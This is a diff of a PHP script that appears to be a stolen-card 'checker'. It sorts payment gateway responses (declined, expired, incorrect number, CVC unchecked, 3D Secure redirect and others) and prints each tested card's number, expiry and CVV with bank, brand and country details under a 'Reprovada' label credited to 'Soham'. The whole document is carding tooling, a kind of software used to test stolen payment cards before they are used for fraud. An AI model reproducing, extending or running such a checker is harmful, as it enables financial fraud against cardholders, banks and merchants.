+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card number is incorrect.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "incorrect_number")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 
 elseif
 (strpos($result3,  'card was declined.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Soham ]  </i></font><br>";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
+
 }
 
 elseif
 (strpos($result3,  "generic_decline")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "do_not_honor")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 
 elseif
 (strpos($result3,  "expired_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card does not support this type of purchase.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "processing_error")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
-
+elseif
+(strpos($result3,  'Invalid account.')) {
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Oops, the payment didn't go through ❌ SOHAM  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
+}
 elseif
 (strpos($result3, "service_not_allowed")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  '"cvc_check": "unchecked"')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  '"cvc_check": "unavailable"')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "parameter_invalid_empty")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "lock_timeout")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "transaction_not_allowed")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3, "three_d_secure_redirect")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Card is declined by your bank, please contact them for additional information.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3, "missing_payment_information")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3, "Payment cannot be processed, missing credit card number")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card has expired.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'card number is incorrect.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "incorrect_number")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [ Soham ]  </i></font><br> ";
 }
 
 
 elseif
 (strpos($result3,  'card was declined.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] [$type] [$brand] [scheme] [$bankcity]</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "'Oops, the payment didn't go through.'")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "do_not_honor")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [ Soham ]  </i></font><br> ";
+  
 }
 
 
 elseif
 (strpos($result3,  "expired_card")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  'Your card does not support this type of purchase.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [ Soham ]  </i></font><br> ";
 }
 
 elseif
 (strpos($result3,  "processing_error")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>processing_error [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3, "service_not_allowed")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 
 elseif
 (strpos($result3,  "parameter_invalid_empty")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "lock_timeout")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3,  "transaction_not_allowed")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 
 elseif
 (strpos($result3,  'Card is declined by your bank, please contact them for additional information.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3, "missing_payment_information")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif
 (strpos($result3, "Payment cannot be processed, missing credit card number")) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
